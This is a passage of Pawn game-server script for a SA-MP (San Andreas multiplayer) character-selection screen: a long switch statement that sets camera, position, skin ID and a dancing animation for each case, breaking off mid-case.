 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 4);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 4;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 4:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 5);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 5;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 5:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 6);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 6;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 6:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 7);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 7;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 7:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 9);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 9;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 8:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 10);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 10;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 9:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 11);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 11;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 10:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 12);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 12;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 11:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 13);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 13;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 12:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 14);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 14;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 13:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 15);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 15;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 14:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 16);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 16;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 15:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 17);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 17;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 16:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 18);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 18;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 17:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 19);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 19;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 18:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 20);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 20;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 19:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 21);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 21;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 20:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 22);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 22;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 21:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 23);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 23;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 22:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 24);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 24;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 23:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 25);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 25;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 24:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 26);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 26;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 25:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 27);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 27;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 26:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 28);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 28;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 27:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 29);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 29;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 28:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 30);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 30;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 29:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 31);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 31;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 30:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 32);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 32;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 31:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 33);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 33;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 32:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 34);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 34;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 33:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 35);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 35;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 34:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 36);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 36;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 35:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 37);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 37;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 36:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 38);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 38;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 37:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 39);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 39;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 38:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 40);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 40;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 39:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 41);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 41;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 40:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 43);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 43;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 41:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 44);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 44;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 42:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 45);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 45;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 43:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 47);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 47;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 44:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 48);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 48;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 45:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 49);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 49;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 46:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 51);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 51;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 47:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 52);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 52;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 48:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 53);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 53;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 49:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 54);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 54;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 50:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 57);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 57;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 51:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 58);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 58;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 52:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 66);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 66;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 53:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 67);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 67;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 54:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 68);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 68;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 55:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 69);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 69;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 56:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 72);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 72;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 57:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 73);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 73;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 58:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 76);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 76;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 59:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 77);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 77;
